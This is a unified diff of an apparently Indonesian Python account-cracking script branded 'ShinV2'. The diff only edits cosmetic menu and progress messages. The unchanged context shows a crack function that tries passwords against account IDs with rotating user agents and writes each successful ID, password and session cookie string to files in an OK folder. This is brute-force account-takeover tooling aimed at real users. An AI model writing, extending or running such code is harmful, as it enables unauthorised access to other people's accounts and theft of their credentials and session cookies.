@@ -168,9 +168,9 @@ def menu(my_name):
 		file()
 	elif jh in ['0','00']:
 		os.system('rm -rf .token.txt')
-		print(x+'\33[1;96m•Sabar Nunggu Ojek ...')
+		print(x+'\33[1;96m•Sabar ...')
 		time.sleep(1)
-		print("""%s \33[1;33mSUKSES KELUAR CROTT AHH """%(h))
+		print("""%s \33[1;33mSUKSES KELUAR """%(h))
 		exit()
 	else:
 		print("""%s \33[1;33mNgajak gelud om pilih yang bener """%(h))
@@ -493,7 +493,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	print('\r%s [ShinV2] %s/%s ~_~ [OK:%s] ^_^ [CP:%s] ~_~ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
+	print('\r%s [ShinV2] %s/%s <-> [OK:%s] <-> [CP:%s] <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
@@ -522,7 +522,7 @@ def crack(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					print(f"\33[1;32m╚══[OK BARUS]\33[1;96m{idf}\33[m•\33[1;96m{pw}\n")
+					print(f"\33[1;32m╚══[OK]\33[1;96m{idf}\33[m•\33[1;96m{pw}\n")
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
